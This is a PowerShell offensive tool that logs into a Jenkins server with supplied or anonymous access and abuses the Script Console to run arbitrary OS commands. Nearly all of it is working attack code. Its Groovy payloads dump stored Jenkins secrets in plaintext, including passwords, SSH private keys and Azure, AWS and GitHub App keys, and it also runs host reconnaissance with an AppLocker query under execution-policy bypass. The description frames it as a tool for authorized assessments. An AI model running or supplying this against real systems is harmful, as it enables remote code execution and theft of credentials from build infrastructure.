function Invoke-JenkinsWebLogin {
<#
.SYNOPSIS
    Authenticates to a Jenkins instance using form-based web login (username +
    password) and executes an OS command or credential/recon extraction payload
    on the controller via the Script Console (/scriptText). Default command is whoami.

.DESCRIPTION
    Intended for authorized security assessments where only the web interface is
    available (no API token). Replicates the browser login flow:
      1. Optionally attempt anonymous execution first (works on open Jenkins
         instances where Overall/RunScripts is granted to anonymous users).
      2. GET the Jenkins /login form and parse its action + hidden fields
         (this captures the CSRF crumb that modern Jenkins requires for login).
      3. POST credentials to the form's action URL to obtain an authenticated
         JSESSIONID session cookie.
      4. Fetch a CSRF crumb inside that authenticated session.
      5. POST a Groovy payload to /scriptText carrying cookie + crumb that runs
         the requested command on the controller's native shell.

    Jenkins Script Console = RCE-by-design for users with Overall/RunScripts.
    See: https://www.jenkins.io/doc/book/managing/script-console/

    The function is designed to be tolerant of Jenkins version differences:
      - Auto-detects the login form action and hidden fields.
      - Falls back to /j_spring_security_check and /j_acegi_security_check.
      - Retries a 403 login without the crumb in case CSRF is disabled/misconfigured.
      - Supports a non-root context path (e.g. /jenkins).
      - Uses -UseBasicParsing so it works on PowerShell 5.1 and 7.

    Built-in extraction switches (-DumpCreds, -DumpSSHKeys, -DumpBasicCreds,
    -TaskList, -Recon, -All) run Groovy payloads inside the Script Console.
    -All runs every extraction payload in one shot.

    Pass -Debug to trace every URI, the login body (password masked), login
    status and final redirect URI, session cookies, the crumb field/value, the
    execute headers, and the raw response body on failure.

.PARAMETER Target       IP address or hostname of the Jenkins server.
                        You may also pass host:port, host:port/path, or a full URL;
                        the script will normalize them. Required unless -ListModes
                        is used.
.PARAMETER Command      OS command to run on the controller (e.g. whoami, w, id,
                        ps aux, tasklist). Runs via cmd /c (Windows) or
                        /bin/sh -c (Linux), so pipes/redirects work. Default whoami.
                        Ignored if -Script is supplied.
.PARAMETER Port         TCP port. Default 8080.
.PARAMETER Scheme       http or https. Default http.
.PARAMETER ContextPath  Optional non-root context path (e.g. /jenkins). Can also
                        be supplied as part of -Target.
.PARAMETER User         Jenkins username.
.PARAMETER Password     Jenkins password as a plain string.
.PARAMETER Script       Full custom Groovy payload. Overrides -Command and all
                        extraction switches.
.PARAMETER LegacyLogin  Use /j_acegi_security_check (pre-Spring Security builds).
.PARAMETER SkipCertCheck Ignore TLS certificate errors (self-signed / lab).
.PARAMETER DumpCreds    Dump Jenkins credentials (username/password, secrets,
                        SSH keys, files, certificates, Azure, AWS, GitHub apps).
.PARAMETER DumpSSHKeys  Dump SSH keys via CredentialsProvider lookup.
.PARAMETER DumpBasicCreds Dump basic username/password and secret credentials
                        using getter methods.
.PARAMETER TaskList     Run 'tasklist /v /fo:csv' on the controller.
.PARAMETER Recon        Run a set of host reconnaissance commands (dir, hostname,
                        whoami /priv, PATH, AppLocker policy, netstat).
.PARAMETER All          Run all extraction payloads in one go.
.PARAMETER ListModes    Print available extraction switches and exit.

.EXAMPLE
    Invoke-JenkinsWebLogin -Target 10.0.0.5 -User admin -Password 'P@ssw0rd!'
    # runs default whoami

.EXAMPLE
    Invoke-JenkinsWebLogin 10.0.0.5 'ps aux' -User admin -Password 'P@ssw0rd!'
    # positional target + command

.EXAMPLE
    Invoke-JenkinsWebLogin -Target jenkins.corp.local -Scheme https -Port 443 -User svc -Command 'tasklist' -SkipCertCheck -Password 'P@ssw0rd!'

.EXAMPLE
    Invoke-JenkinsWebLogin -Target 10.0.0.5 -Port 8080 -ContextPath '/jenkins' -User admin -Password 'P@ssw0rd!' -Command 'id'
    # Jenkins deployed under the /jenkins context path

.EXAMPLE
    Invoke-JenkinsWebLogin -Target 10.0.0.5 -User admin -Password 'P@ssw0rd!'
    # On an open Jenkins instance where anonymous has RunScripts, this skips
    # login and executes anonymously.

.EXAMPLE
    Invoke-JenkinsWebLogin -Target 10.0.0.5 -User admin -Password 'P@ssw0rd!' -DumpCreds
    # Dump Jenkins credentials

.EXAMPLE
    Invoke-JenkinsWebLogin -Target 10.0.0.5 -User admin -Password 'P@ssw0rd!' -All
    # Dump credentials, SSH keys, tasklist, and recon output in one go

.EXAMPLE
    Invoke-JenkinsWebLogin -ListModes
    # Show extraction modes and exit
#>

    [CmdletBinding()]
    param(
        [Parameter(Position = 0)]
        [string]$Target,

        [Parameter(Position = 1)]
        [string]$Command = 'whoami',

        [int]$Port = 8080,

        [ValidateSet('http', 'https')]
        [string]$Scheme = 'http',

        [string]$User,

        [string]$Password,

        [string]$Script,

        [string]$ContextPath = '',

        [switch]$LegacyLogin,

        [switch]$SkipCertCheck,

        [switch]$DumpCreds,

        [switch]$DumpSSHKeys,

        [switch]$DumpBasicCreds,

        [switch]$TaskList,

        [switch]$Recon,

        [switch]$All,

        [switch]$ListModes
    )

    $ErrorActionPreference = 'Stop'
    if ($PSBoundParameters.ContainsKey('Debug')) { $DebugPreference = 'Continue' }

    if ($ListModes) {
        Write-Host "Available extraction switches:" -ForegroundColor Cyan
        Write-Host "  -DumpCreds      : Dump broad Jenkins credential types"
        Write-Host "  -DumpSSHKeys    : Dump SSH keys + some username/password creds"
        Write-Host "  -DumpBasicCreds : Dump basic username/password + secret creds"
        Write-Host "  -TaskList       : Run tasklist /v /fo:csv on controller"
        Write-Host "  -Recon          : Run host recon commands (dir/hostname/whoami/PATH/AppLocker/netstat)"
        Write-Host "  -All            : Run all extraction switches above"
        Write-Host ""
        Write-Host "Priority order: -Script > extraction switches > -Command"
        return
    }

    if (-not $Target) {
        throw "-Target is required unless -ListModes is used."
    }

    # --- Normalize Target in case a URL or context path was pasted in --------
    if ($Target -match '^https?://') {
        $u = [System.Uri]$Target
        $Target = $u.Host
        if ($u.Port -gt 0 -and -not $PSBoundParameters.ContainsKey('Port')) { $Port = $u.Port }
        if (-not $PSBoundParameters.ContainsKey('Scheme')) { $Scheme = $u.Scheme }
        if (-not $PSBoundParameters.ContainsKey('ContextPath') -and $u.AbsolutePath -and $u.AbsolutePath -ne '/') {
            $ContextPath = $u.AbsolutePath.TrimEnd('/')
        }
        Write-Warning "-Target looked like a URL; using host '$Target' (port $Port, scheme $Scheme, context '$ContextPath')."
    }
    elseif ($Target -match '^([^/]+)(/.+)$') {
        # Allow host:port/jenkins as a shortcut
        $Target = $Matches[1]
        if (-not $PSBoundParameters.ContainsKey('ContextPath')) {
            $ContextPath = $Matches[2].TrimEnd('/')
        }
    }
    if ($Target -match '[:/]') {
        throw "-Target must be a plain hostname or IP address (got: $Target)"
    }

    $ContextPath = $ContextPath.Trim()
    if ($ContextPath -and -not $ContextPath.StartsWith('/')) { $ContextPath = '/' + $ContextPath }

    $base = "{0}://{1}:{2}{3}" -f $Scheme, $Target, $Port, $ContextPath
    Write-Debug "Base URL      : $base"
    Write-Debug "Scheme/Port   : $Scheme / $Port"
    Write-Debug "ContextPath   : $ContextPath"
    Write-Debug "LegacyLogin   : $LegacyLogin   SkipCertCheck: $SkipCertCheck"
    Write-Debug "PS version    : $($PSVersionTable.PSVersion)"

    # --- Build cross-platform command payload or extraction payload ----------
    # -Script overrides everything. Then extraction switches. Then -Command.
    if (-not $PSBoundParameters.ContainsKey('Script')) {
        $PayloadDumpCreds = @"
println '===== DumpCreds ====='
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*

domain = Domain.global()
store = SystemCredentialsProvider.getInstance().getStore()

for (credential in store.getCredentials(domain)) {
    if (credential instanceof UsernamePasswordCredentialsImpl) {
        println(String.format("id=%s user=%s pass=%s", credential.id, credential.username, credential.password.plainText))
    }
    else if (credential instanceof StringCredentialsImpl) {
        println(String.format("id=%s secret=%s", credential.id, credential.secret.plainText))
    }
    else if (credential instanceof BasicSSHUserPrivateKey) {
        println(String.format("id=%s user=%s key=%s", credential.id, credential.username, credential.privateKey))
    }
    else if (credential instanceof FileCredentialsImpl) {
        println(String.format("id=%s file=%s", credential.id, credential.fileName))
    }
    else if (credential instanceof CertificateCredentialsImpl) {
        println(String.format("id=%s pass=%s", credential.id, credential.password.plainText))
    }
    else if (credential.getClass().toString() == "class com.microsoft.azure.util.AzureCredentials") {
        println(String.format("id=%s subscriptionId=%s clientId=%s clientSecret=%s tenant=%s",
            credential.id, credential.subscriptionId, credential.clientId, credential.plainClientSecret, credential.tenant))
    }
    else if (credential.getClass().toString() == "class com.cloudbees.jenkins.plugins.awscredentials.AWSCredentialsImpl") {
        println(String.format("id=%s accessKey=%s secretKey=%s", credential.id, credential.accessKey, credential.secretKey.plainText))
    }
    else if (credential.getClass().toString() == "class org.jenkinsci.plugins.github_branch_source.GitHubAppCredentials") {
        println(String.format("id=%s appID=%s user=%s privateKey=%s",
            credential.id, credential.appID, credential.username, credential.privateKey.plainText))
    }
    else {
        println(String.format("Unknown type: %s id=%s", credential.getClass(), credential.id))
    }
}
"@

        $PayloadDumpSSHKeys = @"
println '===== DumpSSHKeys ====='
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,Jenkins.instance,null,null)
for(c in creds) {
  if(c instanceof com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey) {
    println(String.format("id=%s desc=%s key=%s\n", c.id, c.description, c.privateKeySource.getPrivateKeys()))
  }
  if (c instanceof com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl) {
    println(String.format("id=%s desc=%s user=%s pass=%s\n", c.id, c.description, c.username, c.password))
  }
}
"@

        $PayloadDumpBasicCreds = @"
println '===== DumpBasicCreds ====='
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.plugins.credentials.impl.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*

domain = Domain.global()
store = SystemCredentialsProvider.getInstance().getStore()

for (credential in store.getCredentials(domain)) {
    if (credential instanceof UsernamePasswordCredentialsImpl) {
        println credential.getId() + " " + credential.getUsername() + " " + credential.getPassword().getPlainText()
    } else if (credential instanceof StringCredentialsImpl) {
        println credential.getId() + " " + credential.getSecret().getPlainText()
    } else if(credential instanceof BasicSSHUserPrivateKey) {
        println credential.getId() + " " + credential.getUsername() + "\n" + credential.getPrivateKey()
    } else if (credential.getClass().toString() == "class com.microsoft.azure.util.AzureCredentials") {
        println "AzureCred:" + credential.getSubscriptionId() + " " + credential.getClientId() + " " + credential.getPlainClientSecret() + " " + credential.getTenant()
    } else if (credential.getClass().toString() == "class org.jenkinsci.plugins.github_branch_source.GitHubAppCredentials") {
        println credential.getId() + " " + credential.getUsername() + "\n" + credential.getPrivateKey().getPlainText()
    } else {
        println credential.getClass()
    }
}
"@

        $PayloadTaskList = @"
println '===== TaskList ====='
def isWinTaskList = System.getProperty('os.name').toLowerCase().contains('win')
def runCmdTaskList = { label, cmd ->
  try {
    println "== ${label} =="
    def proc = cmd.execute()
    proc.waitForOrKill(30000)
    println proc.in.text
    def err = proc.err.text
    if (err?.trim()) { println '[stderr] ' + err.trim() }
  } catch (Throwable t) {
    println "${label} failed: " + t.message
  }
}
if (isWinTaskList) {
  runCmdTaskList('tasklist /v /fo:csv', ['cmd','/c','tasklist /v /fo:csv'])
} else {
  runCmdTaskList('ps -ef', ['/bin/sh','-c','ps -ef'])
}
"@

        $PayloadRecon = @"
println '===== Recon ====='
def runReconCmd(label, cmd) {
  try {
    println "== ${label} =="
    def proc = cmd.execute()
    proc.waitForOrKill(30000)
    println proc.in.text
    def err = proc.err.text
    if (err?.trim()) { println '[stderr] ' + err.trim() }
  } catch (Throwable t) {
    println "${label} failed: " + t.message
  }
}

def isWindowsRecon = System.getProperty('os.name').toLowerCase().contains('win')
if (isWindowsRecon) {
  runReconCmd('cd \\\\ && dir /s /b', ['cmd','/c','cd \\\\ && dir /s /b'])
  runReconCmd('dir', ['cmd','/c','dir'])
  runReconCmd('hostname', ['cmd','/c','hostname'])
  runReconCmd('whoami /priv', ['cmd','/c','whoami /priv'])
  runReconCmd('PATH', ['cmd','/c','echo %PATH%'])
  runReconCmd('AppLocker policy', ['powershell','-ep','bypass','-noprofile','-command','get-applockerpolicy -local'])
  runReconCmd('netstat', ['cmd','/c','netstat'])
} else {
  runReconCmd('pwd', ['/bin/sh','-c','pwd'])
  runReconCmd('ls -la /', ['/bin/sh','-c','ls -la /'])
  runReconCmd('hostname', ['/bin/sh','-c','hostname'])
  runReconCmd('whoami', ['/bin/sh','-c','whoami'])
  runReconCmd('id', ['/bin/sh','-c','id'])
  runReconCmd('PATH', ['/bin/sh','-c','echo $PATH'])
  runReconCmd('netstat -tulpn', ['/bin/sh','-c','netstat -tulpn'])
}
"@

        $scriptParts = [System.Collections.ArrayList]@()
        if ($All -or $DumpCreds)     { [void]$scriptParts.Add($PayloadDumpCreds) }
        if ($All -or $DumpSSHKeys)   { [void]$scriptParts.Add($PayloadDumpSSHKeys) }
        if ($All -or $DumpBasicCreds){ [void]$scriptParts.Add($PayloadDumpBasicCreds) }
        if ($All -or $TaskList)      { [void]$scriptParts.Add($PayloadTaskList) }
        if ($All -or $Recon)         { [void]$scriptParts.Add($PayloadRecon) }

        if ($scriptParts.Count -gt 0) {
            $Script = ($scriptParts -join "`nprintln `'===== NEXT SECTION =====`' `n")
        } else {
            $cmdB64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($Command))
            $Script = @"
def isWin   = System.getProperty('os.name').toLowerCase().contains('win')
def userCmd = new String('$cmdB64'.decodeBase64(), 'UTF-8')
def argv    = isWin ? ['cmd', '/c', userCmd] : ['/bin/sh', '-c', userCmd]
def out = ''
try {
    def proc = argv.execute()
    proc.waitForOrKill(30000)
    out = proc.in.text
    def err = proc.err.text
    if (err?.trim()) { out += (out ? '\n' : '') + '[stderr] ' + err.trim() }
    if (!out?.trim()) { out = '(no output; exit value ' + proc.exitValue() + ')' }
} catch (Throwable t) {
    out = 'command exec failed: ' + t.message
}
println 'os.name  : ' + System.getProperty('os.name')
println 'JVM user : ' + System.getProperty('user.name')
println 'command  : ' + userCmd
println '--- output ---'
println out
"@
        }
    }

    if ($PSBoundParameters.ContainsKey('Script')) {
        Write-Debug "Payload       : custom -Script ($($Script.Length) chars)"
    } elseif ($All -or $DumpCreds -or $DumpSSHKeys -or $DumpBasicCreds -or $TaskList -or $Recon) {
        Write-Debug "Payload       : extraction mode ($($Script.Length) chars)"
    } else {
        Write-Debug "Command       : $Command"
        Write-Debug ("Payload Groovy:`n" + $Script)
    }

    # --- Password (plain string) ---------------------------------------------
    $plainPass = $Password

    # --- TLS handling + common request settings ------------------------------
    $common = @{
        UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    if ($SkipCertCheck) {
        if ($PSVersionTable.PSVersion.Major -ge 6) {
            $common['SkipCertificateCheck'] = $true
        } else {
            [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        }
    }

    # --- Try anonymous execution first (no-login / open Jenkins) -------------
    # If the Script Console is reachable without credentials, just run and exit.
    Write-Debug "Checking anonymous access to $base/scriptText"
    try {
        $anonHeaders = @{
            'Content-Type' = 'application/x-www-form-urlencoded'
        }
        try {
            $anonCrumb = Invoke-RestMethod -Uri "$base/crumbIssuer/api/json" -Method Get @common
            $anonHeaders[$anonCrumb.crumbRequestField] = $anonCrumb.crumb
            Write-Debug "Anonymous crumb: $($anonCrumb.crumbRequestField)=$($anonCrumb.crumb)"
        } catch {
            Write-Debug "Anonymous crumb not available: $($_.Exception.Message)"
        }
        $anonResp = Invoke-RestMethod -Uri "$base/scriptText" -Method Post `
                                      -Body @{ script = $Script } -Headers $anonHeaders @common
        # If we were silently redirected to the login page, the body will be HTML.
        if ($anonResp -is [string] -and $anonResp.TrimStart() -match '^\s*<') {
            Write-Debug "Anonymous response looks like HTML (likely redirect to login); proceeding to login."
        } else {
            Write-Host "[+] Anonymous script execution succeeded (no login required)." -ForegroundColor Green
            Write-Output $anonResp
            return
        }
    } catch {
        $status = $_.Exception.Response.StatusCode.value__ 2>$null
        Write-Debug "Anonymous execution attempt returned HTTP $status"
        if ($status -notin @(401, 403)) {
            # Anonymous access worked but the script itself failed (e.g. bad command, 500).
            Write-Host "[-] Script execution failed (HTTP $status): $($_.Exception.Message)" -ForegroundColor Red
            if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
                Write-Output $_.ErrorDetails.Message
            }
            return
        }
        # 401/403 => anonymous is not allowed or not privileged; proceed to login.
        Write-Host "[*] Anonymous access not allowed or insufficient; proceeding to login." -ForegroundColor Yellow
    }

    if (-not $User -or -not $Password) {
        throw "This Jenkins instance requires authentication. Provide -User and -Password."
    }

    # --- Step 0: fetch login form and extract action + hidden fields ---------
    $primeUri  = "$base/login?from=%2Fscript"
    $loginPath = if ($LegacyLogin) { '/j_acegi_security_check' } else { '/j_spring_security_check' }

    Write-Host "[*] Target : $base"      -ForegroundColor Cyan
    Write-Host "[*] Login page: $primeUri" -ForegroundColor Cyan

    # /login is only ever GET here, never POSTed to.
    Write-Debug "Prime URI     : $primeUri (GET)"
    try {
        $loginPage = Invoke-WebRequest -Uri $primeUri -SessionVariable session -Method Get -UseBasicParsing @common
    } catch {
        Write-Host "[-] Could not load login page: $($_.Exception.Message)" -ForegroundColor Red
        return
    }
    Write-Debug ("Cookies (pre) : " + (($session.Cookies.GetCookies($base) | ForEach-Object { $_.Name }) -join ', '))

    # Extract the form action (modern Jenkins may use a different path)
    $formAction = $null
    if ($loginPage.Forms -and $loginPage.Forms.Count -gt 0) {
        $formAction = $loginPage.Forms[0].Action
    }
    if (-not $formAction -and $loginPage.Content -match '<form[^>]*action=["'']([^"'']*)["'']') {
        $formAction = $Matches[1]
    }
    if (-not $formAction) {
        $formAction = $loginPath
    }

    # Resolve relative action to absolute URI
    if ($formAction -notmatch '^https?://') {
        if ($formAction.StartsWith('/')) {
            $formAction = "$base$formAction"
        } else {
            $formAction = "$base/$formAction"
        }
    }
    $loginUri = $formAction
    Write-Debug "Form action   : $loginUri"

    # Build the login body from the form's hidden fields (crumb, from, etc.)
    $loginBody = @{
        j_username = $User
        j_password = $plainPass
        Submit     = 'Sign in'
    }

    # Collect hidden fields from parsed form (PS 6+) or regex fallback (PS 5.1 + -UseBasicParsing)
    $hiddenFields = @{}
    if ($loginPage.Forms -and $loginPage.Forms.Count -gt 0 -and $loginPage.Forms[0].Fields) {
        foreach ($field in $loginPage.Forms[0].Fields.GetEnumerator()) {
            if ($field.Key -in @('j_username','j_password','Submit')) { continue }
            $hiddenFields[$field.Key] = $field.Value
        }
    } else {
        $html = $loginPage.Content
        if ($html) {
            $reHidden = [regex]'<input[^>]*type=["'']hidden["''][^>]*>'
            foreach ($tag in $reHidden.Matches($html).Value) {
                $n = $null; $v = ''
                if ($tag -match 'name\s*=\s*["'']([^"'']*)["'']') { $n = $Matches[1] }
                elseif ($tag -match 'name\s*=\s*([^>\s]+)') { $n = $Matches[1] }
                if ($tag -match 'value\s*=\s*["'']([^"'']*)["'']') { $v = $Matches[1] }
                elseif ($tag -match 'value\s*=\s*([^>\s]+)') { $v = $Matches[1] }
                if ($n -and $n -notin @('j_username','j_password','Submit')) {
                    $hiddenFields[$n] = $v
                }
            }
        }
    }

    foreach ($field in $hiddenFields.GetEnumerator()) {
        $value = $field.Value
        # Force redirect to /script so success/failure detection works
        if ($field.Key -eq 'from') { $value = '/script' }
        $loginBody[$field.Key] = $value
    }
    if (-not $loginBody.ContainsKey('from')) {
        $loginBody['from'] = '/script'
    }

    $loginHeaders = @{
        'Content-Type' = 'application/x-www-form-urlencoded'
    }

    # --- Step 1: credential POST to the auth processor -----------------------
    # Try the parsed form action first, then standard fallback endpoints.
    $loginCandidates = [System.Collections.ArrayList]@($loginUri)
    $stdUri = "$base$loginPath"
    if ($stdUri -ne $loginUri) { [void]$loginCandidates.Add($stdUri) }
    if (-not $LegacyLogin -and "$base/j_acegi_security_check" -notin $loginCandidates) {
        [void]$loginCandidates.Add("$base/j_acegi_security_check")
    }

    $login = $null
    $lastError = $null
    foreach ($candidate in ($loginCandidates | Select-Object -Unique)) {
        foreach ($crumbMode in @('with','without')) {
            $attemptBody = $loginBody.Clone()
            if ($crumbMode -eq 'without') {
                @($attemptBody.Keys) | Where-Object { $_ -notin @('j_username','j_password','Submit','from') } | ForEach-Object { $attemptBody.Remove($_) }
            }
            $dbgBody = $attemptBody.Clone(); $dbgBody['j_password'] = '***'
            Write-Debug "Login URI     : $candidate (POST, crumb=$crumbMode)"
            Write-Debug ("Login body    : " + (($dbgBody.GetEnumerator() | ForEach-Object { '{0}={1}' -f $_.Key, $_.Value }) -join '&'))

            try {
                $login = Invoke-WebRequest -Uri $candidate -Method Post -Body $attemptBody `
                                           -WebSession $session -Headers $loginHeaders -MaximumRedirection 5 -UseBasicParsing @common
                $lastError = $null
                break
            } catch {
                $lastError = $_
                $status = $_.Exception.Response.StatusCode.value__ 2>$null
                Write-Debug "Login attempt failed (HTTP $status): $($_.Exception.Message)"
                # 403 often means a bad/missing crumb; keep trying. Other codes usually mean bad creds/endpoint.
                if ($status -eq 403) { continue }
                break
            }
        }
        if ($login) { break }
    }

    if (-not $login) {
        Write-Host "[-] Login request failed: $($lastError.Exception.Message)" -ForegroundColor Red
        if ($lastError.ErrorDetails -and $lastError.ErrorDetails.Message) {
            Write-Debug "Response body : $($lastError.ErrorDetails.Message)"
        }
        return
    }

    Write-Debug "Login status  : $($login.StatusCode)"
    Write-Debug "Final URI     : $($login.BaseResponse.ResponseUri.AbsoluteUri)"
    Write-Debug ("Cookies       : " + (($session.Cookies.GetCookies($base) | ForEach-Object { $_.Name }) -join ', '))

    # Failure path redirects to /loginError; verify we did not land there.
    if ($login.BaseResponse.ResponseUri.AbsoluteUri -match 'loginError' -or
        $login.Content -match 'Invalid username or password|Authentication failed|Bad credentials') {
        Write-Host "[-] Authentication failed (bad credentials or account locked)." -ForegroundColor Red
        return
    }
    $sessionCookies = $session.Cookies.GetCookies($base)
    if (-not ($sessionCookies | Where-Object { $_.Name -match 'JSESSIONID|SESSION' })) {
        Write-Host "[-] No session cookie set; login likely failed." -ForegroundColor Red
        return
    }
    Write-Host "[+] Authenticated; session established." -ForegroundColor Green

    # --- Step 2: CSRF crumb within the session -------------------------------
    $headers = @{
        'Content-Type' = 'application/x-www-form-urlencoded'
    }
    Write-Debug "Crumb URI     : $base/crumbIssuer/api/json (GET)"
    try {
        $crumb = Invoke-RestMethod -Uri "$base/crumbIssuer/api/json" -WebSession $session `
                                   -Method Get @common
        $headers[$crumb.crumbRequestField] = $crumb.crumb
        Write-Host "[+] Crumb acquired: $($crumb.crumbRequestField)" -ForegroundColor Green
        Write-Debug "Crumb field   : $($crumb.crumbRequestField)"
        Write-Debug "Crumb value   : $($crumb.crumb)"
    } catch {
        Write-Host "[!] Crumb retrieval failed (CSRF may be disabled): $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # --- Step 3: execute payload ---------------------------------------------
    $uri = "$base/scriptText"
    if ($PSBoundParameters.ContainsKey('Script')) {
        Write-Host "[*] Payload: custom Groovy (-Script)" -ForegroundColor Cyan
    } elseif ($All -or $DumpCreds -or $DumpSSHKeys -or $DumpBasicCreds -or $TaskList -or $Recon) {
        Write-Host "[*] Payload: extraction switch mode" -ForegroundColor Cyan
    } else {
        Write-Host "[*] Command: $Command" -ForegroundColor Cyan
    }
    Write-Host "[*] POST -> $uri`n" -ForegroundColor Cyan

    Write-Debug "Execute URI   : $uri (POST)"
    Write-Debug ("Headers sent  : " + (($headers.Keys) -join ', '))
    Write-Debug "Script length : $($Script.Length) chars"

    try {
        $resp = Invoke-RestMethod -Uri $uri -WebSession $session -Headers $headers `
                                  -Method Post -Body @{ script = $Script } @common
        Write-Host "[+] Response:" -ForegroundColor Green
        Write-Output $resp
    } catch {
        $status = $_.Exception.Response.StatusCode.value__ 2>$null
        Write-Host "[-] Execution failed (HTTP $status): $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "    403 => account lacks Overall/RunScripts." -ForegroundColor DarkYellow
        if ($_.ErrorDetails -and $_.ErrorDetails.Message) {
            Write-Debug "Response body : $($_.ErrorDetails.Message)"
        }
        return
    } finally {
        $plainPass = $null; [GC]::Collect()
    }
}
